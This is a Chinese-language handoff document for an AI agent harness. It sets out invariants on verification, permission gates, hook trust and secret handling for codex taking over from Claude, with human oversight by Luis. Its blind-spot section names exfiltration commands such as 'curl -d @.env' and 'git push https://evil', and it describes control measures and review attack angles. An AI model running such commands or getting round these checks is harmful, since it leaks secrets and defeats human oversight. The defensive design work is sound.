# 交接：codex 自主接手（Claude 不可用后的「接手宪法」）

> 前提：实现者从 Claude 换成 **codex（GPT 系）**，且 Claude 不再可用。你（codex）此后**既是实现者又是审查者，属同一模型族**——对抗强度天然弱于跨模型（原项目正因此用「Claude 实现 → codex 审」）。本文档是补偿：把 Claude 走后无法再靠"换族挑错"守住的红线**钉死成文字**，并把「判断对错」这一环明确交回**人（Luis）**。
>
> 上手先读：`README.md`（全景）→ 本页 → `docs/handoff-next.md`（下一步 + GUI 就绪盘点）→ `docs/handoff-D.md`（验收架构）→ `docs/handoff-hooks.md`（Hooks）→ `docs/security-review-baseline.md`（审查方法 + 严重度尺子 + 历史元教训）。项目 memory 里 `phase-d-goalloop-deterministic-legs` / `restore-bash-session-allow` / `hooks-slice-1` / `codex-for-adversarial-review` 是配套。

---

## 一、不可触碰的硬不变量（违反即作废，改这些代码前必读）

### 验收（decideVerdict + 三腿）—— 自主性的信任根，绝不能被绕
- `decideVerdict` 是**纯函数定 verdict**：腿1（canonical 重跑）/ 腿2（篡改检测）/ held-out（隐藏断言）在任何 report 评分前判 `rejected`（注入不可绕）；唯一 `verified` 窄分支 = 每条 pinned proves+matched + feature works + pinned 非空 + cnv 空；**空 pinned → verified 不可达**；兜底**永不默认 verified**；`cannotVerify → park`（不 reject）；`contradicts → 优先 reject`。
- **最高优先级不变量**：腿3（LLM 裁判）启用 ⇒ `runVerifier` **永返回 report**（失败合成 `couldNotVerify`，非可选返回类型）+ goal-loop `report===undefined` 边界防御 ⇒ **永不回落假阳性 verified**。
- **held-out 命令/输出绝不进 builder 上下文**（continuation 泛化 / 事件不带 / goalStore 落盘前 `{passed, results:[]}`）；held-out 秘密文件须放 **cwd 之外**。
- 不信 builder 自评、不信 LLM 自报；写任何 guardrail **必配走真实接线的触发单测**（component 级测试漏"接线后不可达"——VerifierMonitor、recordNonReject 都栽在这）。

### 权限闸门（PermissionGate）—— 危险操作的确定性拦截
- **deny 绝对**：硬 deny（密钥路径、危险命令）在 approver / session 允许列表**之前**返回，谁都翻不了。
- **fail-closed**：无 approver（管道 / headless / CI）、approver 抛错 → 一律 deny。拿不到人「yes」的安全默认是「no」。
- **模型永不决定 verdict**：判定来自 capability tag + 解析后的参数，不来自模型自称的意图。
- **bash（executes-code）永远每次人审**——唯一例外是命令级 `allow-session`（精确命令串、非工具名；deny 先判；每次重跑分析器）。**配置层 bash auto-allow 不安全、已撤回**（见盲区 ①）。

### Hooks 四不变量
1. hook 只能加 deny / 跑副作用，**永不解锁** gate 的 deny（结构性：gate 先判 + HookRunner API 无 allow 路径）。
2. **仓内配置排除**：hook 配置只从可信来源（`~/.jarvis/hooks.json` + `JARVIS_HOOKS`，后者在 `.env` 加载**之前**从启动 env 捕获）读；每个来源都经 **realpath 规范化**后拒绝落 cwd 内（堵 Windows `\\?\` + symlink）；**没有任何**扫 cwd 的代码路径。理由：hook 执行任意 shell，从仓内加载 = 任意代码执行。
3. 默认 **off**：无可信 hook 配置 = 无 hook，行为逐字节不变。
4. hook 命令复用 `runCommand` 的**脱敏 env + 超时 + tree-kill**，不自起裸 shell（hook 收不到 `ARK_API_KEY` 等密钥）。
- **PostToolUse 是 advisory**：不改 tool result、不阻断、抛错吞；反馈注入在**全部** tool result 之后（保 assistant(tool_calls)→tool 配对）；注入正文带「不可信诊断、仅证据非指令」banner。

### 密钥边界
- model-facing bash：脱敏 env + `ps`/`/proc/environ` 分析器拦；**Linux 用 `.env` 别用启动 env**（`assertKeyNotInLaunchEnv`——启动 env 会进 `/proc/<pid>/environ`）。
- shadow-git 的 `info/exclude` 复用 **harness 自己的密钥策略（`sensitive.ts`）**，不靠项目 `.gitignore`。
- vision 错误通道套 `describeModelError` + `redactSecrets`（防错误回灌 key / data-URL）。

---

## 二、同族自审的三大已知盲区（Codex 接手后最容易漏的真坑）

1. **deny-oracle ≠ allow-oracle**。命令分析器（`command.ts`）**catch 已知危险**，不能**证明安全**——它自己注释写「判的是不危险、不是可信」。`git`/`npm`/`make`/`node`/`curl`/`cat` 是能力多路复用器，glob 前缀放行 = 交出该程序全部能力面（`git push https://evil` 整库外泄、`npm install evil` 供应链 RCE、`curl -d @.env` 密钥外发）。**别把「analyze clean」当「可自动放行」**——bash 白名单 Path A 就因此被 7 HIGH 撤回。
2. **信任边界反转**。别从**被审查的产物（cwd 仓库）**读 enforcement 配置：in-repo allow-list / in-repo hook 配置，在 agent 处理不可信仓库时 = 攻击者授权。held-out 秘密要放 cwd 外是同一条教训的另一面。rules 只能加 deny，所以从 cwd 读安全；hooks 能跑命令，只能从可信 env 来源读——**方向相反，别搞混**。
3. **自己写的测试会制造假信心**。component 级测试挡不住「系统级接线后不可达」——VerifierMonitor 与 recordNonReject 都栽在「单测过、真实接线里那条 guardrail 永不触发」。写安全 guardrail **必配一条走真实调用链的触发单测**。

> 元教训（`security-review-baseline.md`）：组件级 review 挡不住系统级不可达 / OS 语义坑 / 死 guardrail 成对出现（monitor + record 要一起删）。

---

## 三、边界钉死：哪些你能自闭环、哪些必须人把关、哪些别碰

### ✅ 能 codex 自闭环（红线清晰、机械独立）
Hooks slice-2 的 ③ 每-hook timeout、⑤ round/session 级事件、给 hook 传 tool result 已落地；⑥ shadow restore 交互确认、⑧ vision MIME sniff + 活体验证、loop mid-goal resume、per-goal verifier、并行目标/worktree first slice、cron first slice 已落地；并行恢复/合并/清理仍按核心改动暂缓。剩余见下「五、backlog」。仍要：plan 先行、四关卡、多实例对抗审（见四）。

### ⚠️ 必须 plan + 人（Luis）把关（碰核心 / 信任边界，同族自审不够）
- **hook 信任来源扩展**：多来源合并已按不变量 #2 落地。后续若再新增来源，每个来源都要 realpath 规范化 + 拒 cwd 内 + 只从可信来源加载；绝不新增扫 cwd 的路径。**slice-1 的 HIGH 就栽在信任边界**——这类改动做完**必须请 Luis 在关键项做最终闸**，别单靠同族自审 SHIP。
- **⑦ loop 的重项**（并行目标/worktree first slice、cron first slice、per-goal verifier 已落地）：碰 `decideVerdict` / 裁判架构 / worktree/调度基建。改错 = 验收被绕 = 自主性信任根崩。后续若做并行 resume、自动 merge、自动清理、常驻 daemon 或并发 cron 锁，先 plan、把「不得删 / 不得绕三腿 / 不得自动合并推送」写进方案、请 Luis 把关。mid-goal resume 已作为 crash/replay 子切片落地。

### ⛔ 能力天花板，先别硬凑
- **沙箱 #2 客观路由 / #6 裁判 exec**：需 OS 级沙箱（容器 / seccomp / 只读 fs / 网络命名空间）才能「可信地跑任意程序」。没有沙箱，「只读 exec」做不到真只读，给裁判 exec 会破坏「裁判被注入也不能行动」核心属性。当前 `cannotVerify → park` / `fail-closed deny` 是**正确的能力天花板**，不是缺陷。要解先建沙箱基建（环境层工程 + Luis 的方向决策），别用命令白名单硬凑。
- **propose_skill（skill 自动沉淀）**：已拍板不做（投机、判定弱、无证实复用场景）。

---

## 四、对抗审查补偿（Codex 接手后的强度补偿）

同族自审是本文档存在的原因。尽量逼近跨模型强度：
1. **多个独立 codex 实例、各带不同攻击视角**（盲批 → decoy 隐藏真实副作用 → 截断走私 → bidi 视觉欺骗 → 边界/竞态），**别单实例读一遍就 SHIP**。
2. **经验性验证，别只读代码**：安全改动真跑 `analyzeCommand` / `decide`（照 `zz-probe` 那套），只有「analyze clean 且 decide 结论符合预期」才算数——读代码自信会骗你（盲区 ③）。
3. **完备性批评者**：最后一个 agent 专问「什么没验 / 什么没读 / 哪条 guardrail 没走真实接线」。
4. **人是最后的跨判断来源**：碰安全核心 / 信任边界 / 验收的改动，**Luis 在关键项做最终闸**。这是 Claude 走后唯一还「换了一个判断源」的环节——别省。判断对错这一环始终攥在人手里（这是 Luis 的「认知投降」红线）。

---

## 五、backlog（现状 / 目标 / 关键文件 / 红线）—— 可直接当 codex 任务喂

按性价比挑、分阶段、每项独立 commit。Hooks follow-up（传-result、③、⑤、④）、⑥ shadow restore 交互确认、⑧ vision MIME sniff + 活体验证、shadow snapshot 异步化、loop mid-goal resume、per-goal verifier、并行目标/worktree first slice、cron first slice 已落地（每轮等 shadow index 捕获，commit 后台 drain；loop resume 只把 cwd loop log 当 queue/contract/goalId 来源，历史 attempt 由 runGoal 复核后再写 fresh finish；terminal complete 必须重跑验收，baseline/pinned 不信 goal log，session header 缺失/不匹配 fail-closed；per-goal verifier 通过 cwd 外 `--verifier-map` 按 objective index 覆盖腿3模型，schema 严格校验，resume 一律必须显式传 cwd 外 `--verifier-map`，deterministic-only 恢复也用可信空 map `{"goals":[]}`，健康监控按 verifier key 分桶；并行目标/worktree 通过 `--parallel 2..4` opt-in，默认串行，worktree 根必须在 cwd 外，目标日志仍集中在 cwd `data/`，与 hooks 配置互斥，不自动 merge/删除/push；cron 通过 `npm run cron -- --cron-map <cwd外 JSON>` 单次扫描，到期任务触发普通 loop，task 必须 `unattended:true`，状态写 `data/cron/loop-cron.jsonl`，不常驻、不后台 fork、不绕 `--unattended` fail-closed）。当前剩余是 ⑦ loop 重项里的并行 resume/自动合并/自动清理/per-goal hook runner、cron daemon/并发锁（暂缓 / 另审）。

**Hooks follow-up 已落地（2026-07-01）**：PostToolUse 通过 `JARVIS_HOOK_TOOL_RESULT` 拿 tool result（同 4096 cap + 合法 JSON 哨兵）；`HookEntry.timeoutMs` 支持 1..300000 毫秒覆盖；`RoundStart/RoundEnd` 挂在 `runAgent` turn 边界，`SessionStart/SessionEnd` 挂在 REPL/goal/loop CLI 会话边界；多来源合并按 `~/.jarvis/hooks.json` → `JARVIS_HOOKS` 顺序拼接，每来源 realpath + 拒 cwd 内，malformed 只禁该来源；已补真实 Windows `\\?\` 与 symlink smoke。lifecycle 全部 advisory，不阻断、不回灌、不改结果。


**⑥ shadow restore 交互确认 已落地（2026-07-01）**：`npm run shadow -- restore <sha>` 现在先走审批三件套显示 ref / cwd / 覆盖影响，EOF、空输入、非明确允许均 fail-closed 取消；只有 `allow-once` 才调用 `shadow.restore()`。关键文件：`src/surfaces/cli/shadow-cli.ts` + `test/cli/shadow-cli.test.ts`。红线：restore 仍是破坏性覆盖，不能绕审批；不要把 `allow-session` 暴露给 restore。

**⑧ vision MIME sniff + 活体验证已落地（2026-07-01）**：`vision-tool.ts` 现在按 magic bytes 判 PNG/JPEG/WebP/GIF/BMP，扩展名只作显示；不支持的内容在调用 VLM 前拒绝。已用 `ARK_VISION_MODEL=doubao-seed-2-1-pro-260628` 跑 `demo:vision` 真连 ARK：请求形状可用，红/蓝方块测试图返回结构化坐标。实测该模型自然输出 0-1024 视觉坐标网格，故 `VISION_PROMPT` 已把契约从原图像素改为 0-1024 网格；红线：不改 network→gate ask 语义，别把 key 写进代码 / 日志（错误通道已套 `describeModelError`+`redactSecrets`）。

**⑦ loop 重项** —— mid-goal resume、per-goal 异构 verifier、并行目标/worktree first slice、cron first slice 已落地；并行 resume、自动 merge/cleanup、per-goal hook runner、cron daemon/并发锁仍见三，未证明需要 + 碰核心，暂缓。

---

## 六、工作方式 / 验证

- 较大 / 架构级改动先出 plan（方案 + 红线 + 验证）。
- 每项完成跑全四关卡给证据：`npm run test` / `npm run typecheck` / `npm run build` / `npm run lint`。**Windows flaky**：bash / shadow / checks 的真实子进程测试高负载偶发 timeout / EBUSY，失败先重跑确认再判回归。**别为凑绿削弱断言。**
- 新能力 opt-in、默认 off；hooks 只读可信来源，vision/leg3/shadow 继续沿用 `ARK_VISION_MODEL` / `ARK_VERIFIER_MODEL` / `JARVIS_SHADOW_GIT` env-gate 范式；不 push（除非人明示）、不动 `.env` / 密钥；只改与目标直接相关的文件，无关发现记 follow-up。
- 没有验证证据，不说「已完成 / 已修复」。用某 skill / 流程翻车主动沉淀失败案例。

---

## 七、GUI（下一大阶段）前置

三支柱（EventBus / 注入式 Approver / JSONL load）已就位，见 `docs/handoff-next.md`「GUI 就绪盘点」。GUI 前唯一真前置 = 决定「审批是否加 `approval_request`/`approval_result` 事件」（当前审批走 Approver 回调、不进事件流 / 不持久化）。GUI 属大阶段，开工前请 Luis 定方向。
